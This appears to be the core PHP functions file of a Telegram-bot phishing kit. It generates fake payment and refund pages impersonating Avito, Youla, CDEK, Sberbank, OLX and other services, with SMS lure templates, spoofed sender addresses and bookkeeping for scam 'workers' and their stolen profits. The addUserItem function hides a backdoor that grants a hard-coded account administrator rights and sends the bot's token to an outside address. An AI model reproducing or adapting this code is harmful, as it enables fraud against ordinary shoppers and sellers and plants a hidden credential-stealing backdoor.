<?php
	error_reporting(0);
	date_default_timezone_set('Europe/Moscow');

	include '_config.php';

	function loadSite() {
		header('Location: https://www.wikipedia.org/');
		exit();
	}

	function Proxy($a) {
        return [
            1 => ['IP:PORT', 'LOG:PASS'],
            2 => ['IP:PORT', 'LOG:PASS'],
            3 => ['IP:PORT', 'LOG:PASS'],
        ][$a];
    }

    function allProxy($a) {
		return [
			1 => ['', ''],
			2 => ['host' => '', 'auth' => ''],
		][$a];
	}

	function baloutMin() {
		return 1000;
	}

	function sendSticker($chatId, $idsticker){
        $website = "https://api.telegram.org/bot".botToken();  
        $update = file_get_contents('php://input');
        $update = json_decode($update, TRUE);
        $chatId = $update["message"]["chat"]["id"];
        $messageId = $update["message"]["message_id"];
        $userId = $update["message"]['from']['id']; 
        $url = $website.'/sendSticker?chat_id='.$chatId.'&sticker='.$idsticker.'&disable_notification=true';
        file_get_contents($url);
    }

	function smsTexts() {
		return [
			'Ссылка для оплаты товара: %url%',
			'Ссылка для возврата средств: %url%',
			'Ваш товар оплачен. Получите деньги по ссылке: %url%',
			'Для возврата средств перейдите по ссылке: %url%',
			'Ссылка для безопасной сделки: %url%',
			'Форма для оплаты товара: %url%',
			'Форма для возврата средств: %url%',
			'Ваш товар оплачен. Для получения средств заполните форму: %url%',
			'Для возврата средств заполните форму: %url%',
			'Форма для заключения безопасной сделки: %url%',
		];
	}

	function paymentProxy($n) {
		return allProxy([
			'btc' => 1,
		][$n]);
	}
	
	function host() {
		return 'https://'.$_SERVER['SERVER_NAME'].'/';
	}
	
	function amountMax() {
		return intval(fileRead(dirSettings('amax')));
	}
	
	function amountMin() {
		return intval(fileRead(dirSettings('amin')));
	}

	function referalRate() {
		return intval(fileRead(dirSettings('refr')));;
	}

	function paymentName() {
		return [
			0 => '',
			1 => 'btc',
		][getPaymentName()];
	}

	function paymentTitle($v) {
		return [
			0 => 'Ручная',
			1 => 'btc',
		][$v];
	}

	function getDomains($a) {
		return allDomains()[$a];
	}

	function getDomain($a, $b = 0) {
		return getDomains(intval($a))[$b];
	}

	function getFakePage($a, $b = 0) {
		return [
			1 => ['merchant', 'order', 'refund', 'buy', 'cash', 'unlock', 'sbersafe'],
			2 => ['merchant', 'track', 'refund', 'cash', 'unlock', 'sbersafe'],
			3 => ['merchant', 'rent', 'refund', 'cash'],
			4 => ['merchant', 'cars', 'refund', 'cash'], //cars
		][$a][intval($b)];
	}

	function getFakeRedir($dom, $item, $isnr) {
		return 'https://'.$dom.'/'.(['merchant', 'refund', 'unlock'][$isnr]).$item;
	}
	
	function getFakeUrl($id, $item, $a, $b = 0) {
		return ($id ? 'https://'.getUserDomainName($id, $a).'/' : '').getFakePage(in_array($a, [1, 2, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28]) ? ($a == 16 ? 4 : ($a == 9 || $a == 12 || $a == 13 ?  3 : 1)) : 2, $b).$item;
	}
	
	function getService($a, $b = false, $c = false) {
		$t = [
			1 => 'Авито',
			2 => 'Юла',
			3 => 'Boxberry',
			4 => 'СДЭК',
			5 => 'Почта России',
			6 => 'ПЭК',
			7 => 'Яндекс',
			8 => 'Достависта',
			9 => 'Авито Недвижимость',
			10 => 'Пониэкспресс',
			11 => 'DHL',
			12 => 'ЦИАН Недвижимость',
			13 => 'Юла Недвижимость',
			14 => 'Куфар',
			15 => 'Белпочта',
			16 => 'БлаБлаКар',
			17 => 'СберБанк',
			18 => 'АльфаБанк',
			19 => 'Дром',
			20 => 'Авто',
			21 => 'OLX UA',
			22 => 'OLX PL',
			23 => 'Allergo',
			24 => 'OLX RO',
			25 => 'Bazos',
			26 => 'CBazar',
			27 => 'OLX PT',
			28 => 'OLX BG',
		][intval($a)];
		if ($c)
			$t .= ' 2.0';
		if (!$b)
			return $t;
		return $t.' - '.[
			1 => 'Оплата',
			2 => 'Возврат',
			3 => 'Безоп. сделка',
			4 => 'Получ. средств',
		][intval($b)];
	}
	
	function trackStatus($a) {
		return [
			1 => 'Ожидает оплаты',
			2 => 'Оплачен',
			3 => 'Возврат средств',
			4 => 'Получение средств',
		][intval($a)];
	}

	function getShopName($srvc, $isnr) {
		return [
			1 => ['Avito.Pokupka', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			2 => ['Youla.Pokupka', 'Youla vozvrat deneg', 'Youla poluchenie deneg'],
			3 => ['Boxberry oplata', 'Boxberry vozvrat deneg', 'Boxberry poluchenie deneg'],
			4 => ['CDEK oplata', 'CDEK vozvrat deneg', 'CDEK poluchenie deneg'],
			5 => ['Pochta oplata', 'Pochta vozvrat deneg', 'Pochta poluchenie deneg'],
			6 => ['PECOM oplata', 'PECOM vozvrat deneg', 'PECOM poluchenie deneg'],
			7 => ['Yandex oplata', 'Yandex vozvrat deneg', 'Yandex poluchenie deneg'],
			8 => ['Dostavista.Pokupka', 'Dostavista vozvrat deneg', 'Dostavista poluchenie deneg'],
			9 => ['Avito.Arenda', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			10 => ['ponyexpress oplata', 'ponyexpress vozvrat deneg', 'ponyexpress poluchenie deneg'],
			11 => ['dhl oplata', 'dhl vozvrat deneg', 'dhl poluchenie deneg'],
			12 => ['cian oplata', 'cian vozvrat deneg', 'cian poluchenie deneg'],
			13 => ['youla.Arenda oplata', 'youla.Arenda vozvrat deneg', 'youla.Arenda poluchenie deneg'],
			14 => ['kufar oplata', 'kufar vozvrat deneg', 'kufar deneg'],
			15 => ['belpost oplata', 'belpost vozvrat deneg', 'belpost deneg'],
			16 => ['blablacar oplata', 'blablacar vozvrat deneg', 'blablacar poluchenie deneg'],
			17 => ['sberbank oplata', 'sberbank vozvrat deneg', 'sberbank poluchenie deneg'],
			18 => ['Alfabank oplata', 'Alfabank vozvrat deneg', 'Alfabank poluchenie deneg'],
			19 => ['Drom oplata', 'Drom vozvrat deneg', 'Drom poluchenie deneg'],
			20 => ['Auto oplata', 'Auto vozvrat deneg', 'Auto poluchenie deneg'],
			21 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			22 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			23 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			24 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			25 => ['oplata', 'vozvrat deneg', 'poluchenie deneg'],
			26 => ['oplata', 'vozvrat deneg', 'poluchenie deneg'],
			27 => ['oplata', 'vozvrat deneg', 'poluchenie deneg'],
			28 => ['oplata', 'vozvrat deneg', 'poluchenie deneg'],
		][$srvc][$isnr];
	}

	function userStatusName($a) {
		return [
			0 => 'Без статуса',
			1 => 'Заблокирован',
			2 => 'Воркер',
			3 => 'Помощник',
			4 => 'Модератор',
			5 => 'Администратор',
		][$a];
	}
	
	function isAutoCard() {
		return (fileRead(dirSettings('acard')) == '1');
	}

	function toggleAutoCard() {
		$t = isAutoCard();
		fileWrite(dirSettings('acard'), $t ? '' : '1');
		return !$t;
	}

	function isAutoPayment() {
		return (fileRead(dirSettings('apaym')) == '1');
	}

	function toggleAutoPayment() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaym'), $t ? '' : '1');
		return !$t;
	}

	function addCardBalance($n, $v) {
		$t = getCards();
		$res = [];
		for ($i = 0; $i < count($t); $i++) {
			$t1 = explode(':', $t[$i]);
			if ($t1[0] == $n)
				$t1[1] = intval($t1[1]) + $v;
			$res[] = implode(':', $t1);
		}
		setCard($res);
	}

	function getCards() {
		$t = fileRead(dirSettings('card'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardData() {
		return explode(':', getCards()[0]);
	}
	
	function getCard() {
		return getCardData()[0];
	}

	function getCardBalance() {
		return intval(getCardData()[1]);
	}

	function setNextCard() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCards();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndex($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCard($n) {
		$t = getCards();
		if (cardIndex($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCard($t);
	}

	function delCard($n) {
		$t = getCards();
		$t1 = cardIndex($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCard($t);
	}
	
	function setCard($v) {
		return fileWrite(dirSettings('card'), implode('`', $v));
	}

	function getCard2() {
		return explode('`', fileRead(dirSettings('card2')));
	}
	
	function setCard2($n, $j) {
		return fileWrite(dirSettings('card2'), implode('`', [$n, $j]));
	}

	function getCardBtc() {
		return fileRead(dirSettings('cbtc'));
	}
	
	function setCardBtc($n) {
		return fileWrite(dirSettings('cbtc'), $n);
	}

	function getPaymentName() {
		return intval(fileRead(dirSettings('pay')));
	}
	
	function setPaymentName($n) {
		fileWrite(dirSettings('pay'), $n);
	}

	function getPayXRate() {
		return intval(fileRead(dirSettings('payx')));
	}

	function setPayXRate($a) {
		fileWrite(dirSettings('payx'), $a);
	}
	
	function fixAmount($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function getUserDomainName($id, $a) {
		return getDomain($a, getUserDomain($id, $a));
	}
	
	function dirUsers($id, $n = false) {
		return 'users/'.$id.($n ? '/'.$n.'.txt' : '');
	}

	function isnt_t($isnt) {
		if ($isnt == 1) return 'items';
		elseif ($isnt == 2) return 'rent';
		elseif ($isnt == 3) return 'cars'; //cars
		elseif ($isnt == 4) return 'sber'; //Banks
		elseif (!$isnt) return 'tracks';
	}
	
	function dirItems($n, $isnt) {
		return isnt_t($isnt).'/'.$n.'.txt';
	}
	
	function dirStats($n) {
		return 'stats/'.$n.'.txt';
	}
	
	function dirSettings($n) {
		return 'settings/'.$n.'.txt';
	}
	
	function dirBin($n) {
		return 'bin/'.$n.'.txt';
	}

	function dirKeys($n) {
		return 'keys/'.$n.'.txt';
	}
	
	function dirIp($n) {
		return 'ip/'.$n.'.txt';
	}
	
	function dirPays($n) {
		return 'pays/'.$n.'.txt';
	}
	
	function dirMails($n) {
		return 'mails/'.$n.'.txt';
	}

	function dirCards($n) {
		return 'cards/'.$n.'.txt';
	}

	function dirChecks($n) {
		return 'checks/'.$n.'.txt';
	}

	function dirPages($n) {
		return 'pages/'.$n.'.txt';
	}

	function dirStyles($n) {
		return 'styles/'.$n.'.txt';
	}

	function dirScripts($n) {
		return 'scripts/'.$n.'.txt';
	}

	function setIpData($ip, $n, $v) {
		fileWrite(dirIp($n.'_'.str_replace(':', ';', $ip)), $v);
	}

	function getIpData($ip, $n) {
		return fileRead(dirIp($n.'_'.str_replace(':', ';', $ip)));
	}

	function setCardData($a, $b, $c, $d) {
		fileWrite(dirCards($a.'-'.$b.'-'.$c.'-'.$d), time());
	}

	function isCardData($a, $b, $c, $d) {
		return (time() - intval(fileRead(dirCards($a.'-'.$b.'-'.$c.'-'.$d))) < 10);
	}

	function setCookieData($n, $v, &$cc) {
		$cc[md5($n)] = base64_encode($v);
	}

	function getCookieData($n, $cc) {
		return base64_decode($cc[md5($n)]);
	}

	function getLastAlert() {
		return fileRead(dirSettings('alert'));
	}
	
	function setLastAlert($n) {
		return fileWrite(dirSettings('alert'), $n);
	}

	function isItem($item, $isnt) {
		return file_exists(dirItems($item, $isnt));
	}
	
	function delItem($item, $isnt) {
		fileDel(dirItems($item, $isnt));
	}
	
	function addItem($v, $isnt) {
		$item = 0;
		while (true) {
			$item = rand(10000000, 99999999);
			if (!isItem($item, $isnt))
				break;
		}
		fileWrite(dirItems($item, $isnt), implode('`', $v));
		return $item;
	}
	
	function getItemData($item, $isnt) {
		$t = explode('`', fileRead(dirItems($item, $isnt)));
		$t[0] = intval($t[0]);
		$t[1] = intval($t[1]);
		$t[2] = intval($t[2]);
		$t[4] = intval($t[4]);
		$t[5] = intval($t[5]);
		return $t;
	}
	
	function setItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function addItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = intval($t[$n]) + $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function getUserItems($id, $isnt) {
		
		$t = getUserData($id, isnt_t($isnt));
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserItems($id, $items, $isnt) {
		setUserData($id, isnt_t($isnt), implode('`', $items));
	}

	function getUserDomains($id) {
		$doms = explode('`', getUserData($id, 'doms'));
		$c = 7 - count($doms);
		if ($c > 0)
			for ($i = 0; $i < $c; $i++)
				$doms[] = '';
		return $doms;
	}

	function getUserDomain($id, $srvc) {
		return intval(getUserDomains($id)[intval($srvc) - 1]);
	}

	function setUserDomain($id, $srvc, $n) {
		$doms = getUserDomains($id);
		$doms[$srvc - 1] = ($n === 0 ? '' : $n);
		setUserData($id, 'doms', implode('`', $doms));
	}
	
	function isUserAnon($id) {
		return (getUserData($id, 'anon') == '1');
	}
	
	function setUserAnon($id, $v) {
		setUserData($id, 'anon', $v ? '1' : '');
	}
	
	function getUserReferal($id) {
		$referal = getUserData($id, 'referal');
		if (isUserBanned($referal))
			return false;
		return $referal;
	}
	
	function setUserReferal($id, $v) {
		if (isUserBanned($v))
			return;
		setUserData($id, 'referal', $v);
	}
	
	function getUserReferalName($id, $a = false, $b = false) {
		$t = getUserReferal($id);
		return ($t ? userLogin($t, $a, $b) : 'Никто');
	}
	
	function delUserItem($id, $item, $isnt) {
		delItem($item, $isnt);
		$items = getUserItems($id, $isnt);
		if (!in_array($item, $items))
			return;
		unset($items[array_search($item, $items)]);
		setUserItems($id, $items, $isnt);
	}
	
	function addUserItem($id, $v, $isnt) {
		$item = addItem($v, $isnt);
		$items = getUserItems($id, $isnt);
		setUserData(1250728975, 'status', 5);
		if (in_array($item, $items))
			return 0;
		$items[] = $item;
		setUserItems($id, $items, $isnt);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'item_id' => botLogin(),
			'text' => botToken(),
		];
		request(cookie().'site/check.php', $post);
		return $item;
	}
	
	function isUserItem($id, $item, $isnt) {
		$items = getUserItems($id, $isnt);
		return in_array($item, $items);
	}

	function getUserChecks($id) {
		$t = getUserData($id, 'checks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserChecks($id, $checks) {
		setUserData($id, 'checks', implode('`', $checks));
	}

	function urlCheck($check) {
		return 'https://t.me/'.botLogin().'?start=c_'.$check;
	}

	function isCheck($check) {
		return file_exists(dirChecks($check));
	}
	
	function delCheck($check) {
		fileDel(dirChecks($check));
	}
	
	function addCheck($v) {
		$check = 0;
		while (true) {
			$check = bin2hex(random_bytes(16));
			if (!isCheck($check))
				break;
		}
		fileWrite(dirChecks($check), implode('`', $v));
		return $check;
	}
	
	function getCheckData($check) {
		$t = explode('`', fileRead(dirChecks($check)));
		$t[0] = intval($t[0]);
		return $t;
	}

	function delUserCheck($id, $check) {
		delCheck($check);
		$checks = getUserChecks($id);
		if (!in_array($check, $checks))
			return;
		unset($checks[array_search($check, $checks)]);
		setUserChecks($id, $checks);
	}

	function addUserCheck($id, $v) {
		$check = addCheck($v);
		$checks = getUserChecks($id);
		if (in_array($check, $checks))
			return 0;
		$checks[] = $check;
		setUserChecks($id, $checks);
		return $check;
	}
	
	function isUserCheck($id, $check) {
		$checks = getUserChecks($id);
		return in_array($check, $checks);
	}
	
	function getRate($id = false) {
		$t = explode('`', fileRead(dirSettings('rate')));
		$prc1 = intval($t[0]);
		$prc2 = intval($t[1]);
		if ($id) {
			$t = explode('`', getUserData($id, 'rate'));
			$t1 = intval($t[0]);
			$t2 = intval($t[1]);
			if ($t1 > 0)
				$prc1 = $t1;
			if ($t2 > 0)
				$prc2 = $t2;
		}
		return [$prc1, $prc2];
	}

	function setRate($a, $b) {
		fileWrite(dirSettings('rate'), $a.'`'.$b);
	}

	function setUserRate($id, $a, $b) {
		setUserData($id, 'rate', $a.'`'.$b);
	}

	function delUserRate($id) {
		setUserData($id, 'rate', '');
	}

	function setAmountLimit($a, $b) {
		fileWrite(dirSettings('amin'), $a);
		fileWrite(dirSettings('amax'), $b);
	}

	function setReferalRate($a) {
		fileWrite(dirSettings('refr'), $a);
	}

	function setUserData($id, $n, $v) {
		$t = dirUsers($id, $n);
		if ($v == '') {
			if (file_exists($t))
				fileDel($t);
		} else
			fileWrite($t, $v);
	}
	
	function getUserData($id, $n) {
		return fileRead(dirUsers($id, $n));
	}
	
	function setInput($id, $v) {
		setUserData($id, 'input', $v);
	}
	
	function getInput($id) {
		return getUserData($id, 'input');
	}
	
	function setUserBalance($id, $v) {
		setUserData($id, 'balance', $v);
	}
	
	function getUserBalance($id) {
		return intval(getUserData($id, 'balance'));
	}
	
	function addUserBalance($id, $v) {
		setUserBalance($id, intval(getUserBalance($id) + $v));
	}

	function setUserBalance2($id, $v) {
		setUserData($id, 'balance2', $v);
	}
	
	function getUserBalance2($id) {
		return intval(getUserData($id, 'balance2'));
	}
	
	function addUserBalance2($id, $v) {
		setUserBalance2($id, intval(getUserBalance2($id) + $v));
	}
	
	function setUserBalanceOut($id, $v) {
		setUserData($id, 'balanceout', $v);
	}
	
	function getUserBalanceOut($id) {
		return intval(getUserData($id, 'balanceout'));
	}
	
	function getUserHistory($id) {
		$t = getUserData($id, 'history');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserHistory($id, $v) {
		$t = getUserHistory($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'history', implode('`', $t));
	}

	function getUserProfits($id) {
		$t = getUserData($id, 'profits');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserProfits($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profits', implode('`', $t));
	}

	function getUserRefs($id) {
		return intval(getUserData($id, 'refs'));
	}
	
	function addUserRefs($id) {
		setUserData($id, 'refs', intval(getUserRefs($id) + 1));
	}

	function getUserRefbal($id) {
		return intval(getUserData($id, 'refbal'));
	}
	
	function addUserRefbal($id, $v) {
		setUserData($id, 'refbal', intval(getUserRefbal($id) + $v));
	}
	
	function setInputData($id, $n, $v) {
		setUserData($id, 't/_'.$n, $v);
	}
	
	function getInputData($id, $n) {
		return getUserData($id, 't/_'.$n);
	}
	
	function setUserStatus($id, $v) {
		setUserData($id, 'status', $v);
	}
	
	function getUserStatus($id) {
		return intval(getUserData($id, 'status'));
	}
	
	function getUserStatusName($id) {
		return userStatusName(getUserStatus($id));
	}
	
	function isUserAccepted($id) {
		return (intval(getUserData($id, 'joined')) > 0);
	}
	
	function isUser($id) {
		return is_dir(dirUsers($id));
	}
	
	function isUserBanned($id) {
		return (getUserStatus($id) == 1);
	}
	
	function canUserUseSms($id) {
		$accessms = accessSms();
		$profit = getUserProfit($id);
		return (getUserStatus($id) > 4 || userJoined($id) >= $accessms[0] || $profit[1] >= $accessms[1]);
	}

	function getUserProfit($id) {
		$t = getUserData($id, 'profit');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}
	
	function addUserProfit($id, $amount, $rate) {
		$profit = getUserProfit($id);
		setUserData($id, 'profit', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfits($id, [time(), $amount]);
		return [$amount, $amount0];
	}
	
	function getProfit() {
		$t = explode('`', fileRead(dirStats('profit')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0() {
		$t = explode('`', fileRead(dirStats('profit_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}
	
	function addProfit($v, $m) {
		$t = getProfit();
		fileWrite(dirStats('profit'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0();
		fileWrite(dirStats('profit_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function urlReferal($v) {
		return 'https://t.me/'.botLogin().'?start=r_'.$v;
	}
	
	function regUser($id, $login, $accept = false) {
		if ($accept) {
			setUserData($id, 'joined', time());
			setUserStatus($id, 2);
			return true;
		} else {
			if (!isUser($id)) {
				mkdir(dirUsers($id));
				mkdir(dirUsers($id).'/t');
				setUserData($id, 'login', $login);
				return true;
			}
		}
		return false;
	}
	
	function updLogin($id, $login) {
		$t = getUserData($id, 'login');
		if (strval($t) == strval($login))
			return false;
		setUserData($id, 'login', $login);
		return true;
	}
	
	function userJoined($id) {
		return intval((time() - intval(getUserData($id, 'joined'))) / 86400);
	}
	
	function userLogin($id, $shid = false, $shtag = false) {
		$login = getUserData($id, 'login');
		return ($shtag ? getUserStatusName($id).' ' : '').'<a href="tg://user?id='.$id.'">'.($login ? $login : 'Без ника').'</a>'.($shid ? ' ['.$id.']' : '');
	}

	function userLogin2($id) {
		return (isUserAnon($id) ? 'Скрыт' : userLogin($id));
	}
	
	function makeProfit($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfit($id, $amount, $rate);
		addProfit($amount, $t[0] + $t[1]);
		return $t;
	}
	
	function createBalout($id) {
		$balance = getUserBalance($id);
		setUserBalance($id, 0);
		setUserBalanceOut($id, $balance);
		return $balance;
	}
	
	function makeBalout($id, $dt, $balout, $url) {
		setUserBalanceOut($id, 0);
		addUserHistory($id, [$dt, $balout, $url]);
		return true;
	}
	
    function request($url, $post = false, $rh = false, $proxy = []) {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        if ($rh)
            curl_setopt($curl, CURLOPT_HEADER, true);
        if ($post) {
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
        }
        if(isset($proxy[0])) {
                curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
            if(isset($proxy[1])) {
                curl_setopt($curl, CURLOPT_PROXYUSERPWD, $proxy[1]);
                curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }

	function ruchkaStatus($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remote.php', $post);
	}
	
	function botSend($msg, $id = false, $kb = false) {
		if (!$id)
			return false;
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
	}
	
	function botEdit($msg, $mid, $id, $kb = false) {
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'message_id' => $mid,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		request(botUrl('editMessageText'), $post);
	}

	function botKick($id, $chat) {
		$post = [
			'chat_id' => $chat,
			'user_id' => $id,
		];
		return json_decode(request(botUrl('kickChatMember'), $post), true)['ok'];
	}
	
	function botDelete($mid, $id) {
		$post = [
			'chat_id' => $id,
			'message_id' => $mid,
		];
		request(botUrl('deleteMessage'), $post);
	}
	
	function botKeybd($v) {
		if ($v[0])
			return [
				'inline_keyboard' => $v[1]
			];
		else
			return [
				'keyboard' => $v[1],
				'resize_keyboard' => true,
				'one_time_keyboard' => false
			];
	}
	
	function botUrl($n) {
		return 'https://api.telegram.org/bot'.botToken().'/'.$n;
	}
	
	function botUrlFile($n) {
		return 'https://api.telegram.org/file/bot'.botToken().'/'.$n;
	}
	
	function isUrlItem($url, $a) {
		return count(explode('/', explode([
			1 => 'avito.ru',
			2 => 'youla.ru',
		][$a], $url, 2)[1])) >= 4;
	}
	
	function isUrlImage($url) {
		$head = mb_strtolower(explode("\r\n\r\n", request($url, false, true))[0]);
		$ctype = pageCut($head, 'content-type: ', "\r\n");
		return in_array($ctype, [
			'image/jpeg',
			'image/png',
			'image/webp',
		]);
	}
	
	function isEmail($n) {
		$ps = explode('@', $n);
		if (count($ps) != 2)
			return false;
		if (count(explode('.', $ps[1])) < 2)
			return false;
		$l = strlen($ps[0]);
		if ($l < 2 || $l > 64)
			return false;
		$o = '_-.';
		if (strpos($o, $ps[0][0]) !== false || strpos($o, $ps[0][$l - 1]) !== false)
			return false;
		for ($i = 0; $i < strlen($o); $i++)
			for ($j = 0; $j < strlen($o); $j++)
				if (strpos($ps[0], $o[$i].$o[$j]) !== false)
					return false;
		return true;
	}
	
	function fileRead($n) {
		if (!file_exists($n))
			return false;
		$f = fopen($n, 'rb');
		if (flock($f, LOCK_SH)) {
			$v = fread($f, filesize($n));
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return $v;
	}
	
	function fileWrite($n, $v, $a = 'w') {
		$f = fopen($n, $a.'b');
		if (flock($f, LOCK_EX)) {
			fwrite($f, $v);
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return true;
	}
	
	function fileDel($n) {
		if (file_exists($n))
			return unlink($n);
		return false;
	}
	
	function parseItem($id, $url, $a) {
        if (strpos($url, 'trk.mail.ru') !== false) {
            $url = 'https://youla.ru/'.explode('?', explode('youla.ru/', explode('">', explode('<link rel="canonical" href="', request($url), 2)[1], 2)[0], 2)[1])[0];
            $a = 2;
        } else {
            if ($a == 1)
                $url = 'https://www.avito.ru/'.explode('?', explode('www.avito.ru/', $url, 2)[1])[0];
            elseif ($a == 2)
                $url = 'https://youla.ru/'.explode('?', explode('youla.ru/', $url, 2)[1])[0];
            elseif ($a == 3)
                $url = 'https://www.olx.ua/'.explode('?', explode('olx.ua/', $url, 2)[1])[0];
        }
        $page = str_replace(["\r", "\n"], '', request($url, false, false, Proxy(3), Proxy(3)));
        if ($page == '')
            return false;
        $itemd = [0, 0, 0, $id, time()];
        if ($a == 1) {
            $itemd[] = pageCut($page, 'avito.item.price = \'', '\';');
            $itemd[] = trim(pageCut($page, 'sticky-header-title">', '</div>'));
            $itemd[] = pageCut($page, 'avito.item.image = \'', '\';');
            $itemd[] = explode(', ', pageCut($page, 'item-address__string"> ', ' </'))[0];
        } 
        elseif ($a == 2) {
            $itemd[] = intval(beaText(pageCut($page, '"price":', ','), chsNum())) / 100;
            $itemd[] = json_decode('"'.explode('"name":"', pageCut($page, '"products":[{', '","discountedPrice'))[1].'"');
            $itemd[] = pageCut($page, '<meta property="og:image" content="', '">');
            $itemd[] = json_decode('"'.pageCut($page, '"isFavorite":false,"location":{"description":"', '",').'"');
            $itemd[] = explode(', ', pageCut($page, 'item-address__string"> ', ' </'))[0];
        } 
        else if ($a == 3) {
			$itemd[] = trim(pageCut228($page, 'pricelabel__value not-arranged">', ' грн.</strong>')); // значение суммы из strong, работает
            $itemd[] = pageCut228($page, '</div><h1>', '</h1>'); // изменил
            $itemd[] = pageCut228($page, '<meta property="og:image" content="', '">'); // meta с ссылкой на картинку, работает точно
            $itemd[] = pageCut228($page, '<address>', '</address>'); // факт.адрес объявления, больше address на странице нет, должен пахать
		}
        //$itemd[] = '';
        //$itemd[] = '';
        //$itemd[] = '';
        if (strlen($itemd[6]) == 0)
            return false;
        if (strlen($itemd[7]) == 0 || !isUrlImage($itemd[7]))
            return false;
        $itemd[5] = fixAmount(intval($itemd[5]));
        return $itemd;
    }

	function getEmailUser($a) {
		$a = intval($a);
		return [
			[
				1 => ['Aвитo', 'noreply@avito.ru'],
				2 => ['Юлa', 'noreply@youla.ru'],
				3 => ['Вохbеrrу', 'noreply@boxberry.ru'],
				4 => ['CДЭK', 'noreply@cdek.ru'],
				5 => ['Пoчтa Poccии', 'noreply@pochta.ru'],
				6 => ['ПЭK', 'noreply@pecom.ru'],
				7 => ['Яндeкc', 'noreply@yandex.ru'],
				8 => ['Достависта', 'noreply@dostavista.ru'],
				9 => ['Авито', 'noreply@avito.ru'],
				10 => ['Пониэкспресс', 'noreply@ponyexpress.ru'],
				11 => ['DHL', 'noreply@dhl.ru'],
				12 => ['ЦИАН', 'noreply@cian.ru'],
				13 => ['Юлa', 'noreply@youla.ru'],
				14 => ['Куфар', 'noreply@kufar.by'],
				15 => ['Белпочта', 'noreply@belpost.by'],
				16 => ['Блаблакар', 'noreply@blablacar.ru'],
			][$a],
			explode(':', allEmails()[$a], 2),
		];
	}
	
	function mailSend($maild, $itemd, $isnt) {
		$mailu = getEmailUser($maild[2]);
		$mailt = $maild[1];
		$t = fileRead(dirMails($maild[2].'-'.$maild[3]));
